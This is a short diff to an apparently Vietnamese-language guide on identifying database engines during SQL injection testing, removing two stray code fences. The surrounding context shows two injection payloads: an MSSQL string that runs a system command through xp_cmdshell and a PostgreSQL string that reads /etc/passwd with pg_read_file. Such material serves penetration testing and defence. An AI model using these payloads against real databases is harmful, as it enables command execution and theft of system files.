@@ -73,7 +73,6 @@ Dưới đây là một số kỹ thuật phát hiện đặc trưng:
 ```sql
 '; EXEC xp_cmdshell 'whoami'--
 ```
-  ```
 
 ## PostgreSQL
 ### Dấu hiệu nhận diện
@@ -110,7 +109,6 @@ Dưới đây là một số kỹ thuật phát hiện đặc trưng:
 ```sql
 ' UNION SELECT pg_read_file('/etc/passwd')--
 ```
-  ```  
 
 ## Oracle
 ### Dấu hiệu nhận diện
